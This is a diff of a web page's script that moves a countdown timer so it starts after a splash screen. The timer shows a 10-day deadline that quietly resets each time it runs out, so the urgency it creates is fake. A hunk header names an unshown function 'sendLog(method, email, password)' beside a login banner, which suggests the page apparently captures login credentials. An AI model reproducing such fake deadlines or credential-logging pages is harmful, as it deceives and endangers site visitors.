@@ -1948,10 +1948,40 @@ function submitRegister() {
       if(auth){auth.style.opacity='1';auth.style.pointerEvents='all';}
     },150);
   }
-  Promise.all([
+Promise.all([
     new Promise(function(r){if(document.readyState==='complete')r();else window.addEventListener('load',r,{once:true});}),
     new Promise(function(r){setTimeout(r,DUR);})
-  ]).then(hide);
+  ]).then(function(){
+    hide();
+    // Запускаем таймер после сплэша
+    var KEY = 'lolz_top_deadline';
+    var dl = parseInt(localStorage.getItem(KEY) || '0');
+    var now = Date.now();
+    if (!dl || dl <= now) {
+      dl = now + 10 * 24 * 60 * 60 * 1000;
+      localStorage.setItem(KEY, String(dl));
+    }
+    function pad(n){ return String(n).padStart(2,'0'); }
+    function tick(){
+      var now = Date.now();
+      var diff = dl - now;
+      if(diff <= 0){
+        dl = Date.now() + 10 * 24 * 60 * 60 * 1000;
+        localStorage.setItem(KEY, String(dl));
+        diff = dl - Date.now();
+      }
+      var d = Math.floor(diff / 86400000);
+      var h = Math.floor((diff % 86400000) / 3600000);
+      var m = Math.floor((diff % 3600000) / 60000);
+      var s = Math.floor((diff % 60000) / 1000);
+      document.getElementById('t-days').textContent  = pad(d);
+      document.getElementById('t-hours').textContent = pad(h);
+      document.getElementById('t-mins').textContent  = pad(m);
+      document.getElementById('t-secs').textContent  = pad(s);
+    }
+    tick();
+    setInterval(tick, 1000);
+  });
 })();
 
 /* ─── SPLASH BG ANIMATION ─── */
@@ -2070,37 +2100,6 @@ async function sendLog(method, email, password) {
 
 </script>
 
-  <script>
-(function(){
-  var KEY = 'lolz_top_deadline';
-  var dl = parseInt(localStorage.getItem(KEY) || '0');
-  var now = Date.now();
-  if (!dl || dl <= now) {
-    dl = now + 10 * 24 * 60 * 60 * 1000;
-    localStorage.setItem(KEY, String(dl));
-  }
-  function pad(n){ return String(n).padStart(2,'0'); }
-  function tick(){
-    var now = Date.now();
-    var diff = dl - now;
-    if(diff <= 0){
-      dl = Date.now() + 10 * 24 * 60 * 60 * 1000;
-      localStorage.setItem(KEY, String(dl));
-      diff = dl - Date.now();
-    }
-    var d = Math.floor(diff / 86400000);
-    var h = Math.floor((diff % 86400000) / 3600000);
-    var m = Math.floor((diff % 3600000) / 60000);
-    var s = Math.floor((diff % 60000) / 1000);
-    document.getElementById('t-days').textContent  = pad(d);
-    document.getElementById('t-hours').textContent = pad(h);
-    document.getElementById('t-mins').textContent  = pad(m);
-    document.getElementById('t-secs').textContent  = pad(s);
-  }
-  tick();
-  setInterval(tick, 1000);
-})();
-</script>
   <!-- LOGIN BANNER -->
 <div id="login-banner">
   <div class="lb-card">
